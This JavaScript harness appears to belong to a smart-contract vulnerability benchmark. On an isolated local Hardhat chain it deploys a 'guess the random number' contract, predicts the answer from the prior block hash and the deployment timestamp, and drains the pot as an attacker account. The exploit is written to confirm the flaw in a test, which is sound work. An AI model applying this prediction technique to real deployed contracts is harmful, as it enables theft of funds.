'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, parseEther, solidityPackedKeccak256 } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CASE_ID = '08-guess_the_random_number';
const SOURCE_FILE = 'guess_the_random_number.sol';
const COMPILER_RELEASE = '0.4.21';
const STAKE = parseEther('1');

function digest(value) {
  return crypto.createHash('sha256').update(value, 'utf8').digest('hex');
}

function compile(source) {
  const input = {
    language: 'Solidity',
    sources: { [SOURCE_FILE]: { content: source } },
    settings: {
      optimizer: { enabled: false },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  const artifact = output.contracts?.[SOURCE_FILE]?.GuessTheRandomNumberChallenge;
  if (!artifact?.abi || !artifact?.evm?.bytecode?.object) throw new Error('benchmark_contract_artifact_missing');
  return artifact;
}

function gasCost(receipt) {
  return BigInt(receipt.gasUsed) * BigInt(receipt.gasPrice);
}

(async () => {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  if (caseId !== CASE_ID || path.basename(sourcePath) !== SOURCE_FILE) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const reportedRelease = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  const actualVersion = String(solc.version());
  if (reportedRelease !== COMPILER_RELEASE || actualVersion.split('+', 1)[0] !== COMPILER_RELEASE) {
    throw new Error(`benchmark_requires_exact_solc_${COMPILER_RELEASE}`);
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('benchmark_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_dynamic_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }

  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_evm_chain_id_mismatch');
  const deployer = await provider.getSigner(0);
  const attacker = await provider.getSigner(1);
  const attackerAddress = await attacker.getAddress();
  const attackerBalanceBefore = await provider.getBalance(attackerAddress);
  const artifact = compile(source);
  const target = await new ContractFactory(artifact.abi, artifact.evm.bytecode.object, deployer)
    .deploy({ value: STAKE });
  const deploymentReceipt = await target.deploymentTransaction().wait();
  if (deploymentReceipt.status !== 1) throw new Error('challenge_deployment_failed');
  await target.waitForDeployment();
  const deploymentBlock = await provider.getBlock(deploymentReceipt.blockNumber);
  const sourceBlockNumber = deploymentReceipt.blockNumber - 1;
  const sourceBlock = await provider.getBlock(sourceBlockNumber);
  if (!deploymentBlock || !sourceBlock || sourceBlock.hash == null) throw new Error('randomness_inputs_unavailable');

  const answerHash = solidityPackedKeccak256(
    ['bytes32', 'uint256'], [sourceBlock.hash, BigInt(deploymentBlock.timestamp)],
  );
  const predictedAnswer = Number(BigInt(answerHash) & 0xffn);
  const targetAddress = await target.getAddress();
  const targetBalanceBeforeGuess = await provider.getBalance(targetAddress, deploymentReceipt.blockNumber);
  if (targetBalanceBeforeGuess !== STAKE) throw new Error('challenge_seed_balance_mismatch');

  const guessReceipt = await (await target.connect(attacker).getFunction('guess')(
    predictedAnswer, { value: STAKE },
  )).wait();
  if (guessReceipt.status !== 1) throw new Error('guess_transaction_failed');
  const targetBalanceAfterGuess = await provider.getBalance(targetAddress, guessReceipt.blockNumber);
  const attackerBalanceAfter = await provider.getBalance(attackerAddress, guessReceipt.blockNumber);
  const guessGasCost = gasCost(guessReceipt);
  const attackerNetProfit = attackerBalanceAfter - attackerBalanceBefore;
  const expectedNetProfit = STAKE - guessGasCost;
  const complete = await target.getFunction('isComplete')();
  const confirmed = targetBalanceAfterGuess === 0n && complete === true
    && attackerNetProfit === expectedNetProfit && attackerNetProfit > 0n;
  const result = {
    schemaVersion: 1,
    caseId: CASE_ID,
    state: confirmed ? 'passed' : 'failed',
    confirmedVulnerability: confirmed,
    vulnerability: 'bad_randomness',
    proofScope: 'attacker_profit_and_contract_balance_depletion',
    mode: 'isolated_in_process',
    compilerVersion: actualVersion,
    compilerKind: 'solc-js-original-source',
    compilerArtifactSha256: compilerArtifactSha256.startsWith('0x')
      ? compilerArtifactSha256 : `0x${compilerArtifactSha256}`,
    sourceSha256,
    targetAddress,
    attackerAddress,
    randomnessSourceBlockNumber: sourceBlockNumber,
    randomnessSourceBlockHash: sourceBlock.hash,
    deploymentBlockNumber: deploymentBlock.number,
    deploymentTimestamp: deploymentBlock.timestamp,
    predictedAnswer,
    recomputedAnswerHash: answerHash,
    targetBalanceBeforeGuessWei: targetBalanceBeforeGuess.toString(),
    targetBalanceAfterGuessWei: targetBalanceAfterGuess.toString(),
    attackerBalanceBeforeWei: attackerBalanceBefore.toString(),
    attackerBalanceAfterWei: attackerBalanceAfter.toString(),
    attackerGrossProfitWei: STAKE.toString(),
    guessGasCostWei: guessGasCost.toString(),
    attackerNetProfitWei: attackerNetProfit.toString(),
    expectedNetProfitWei: expectedNetProfit.toString(),
    isComplete: complete,
    transactionHashes: [deploymentReceipt.hash, guessReceipt.hash],
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'predicted_guess_payout_or_net_profit_assertion_failed',
    reproduction: '从部署交易前一区块读取公开 blockhash，并结合部署区块时间戳重算 uint8 答案；攻击者提交 1 ETH 猜测并提走 2 ETH，核验奖池归零，且按攻击者账户余额变化扣除 gas 后仍有正净收益。',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
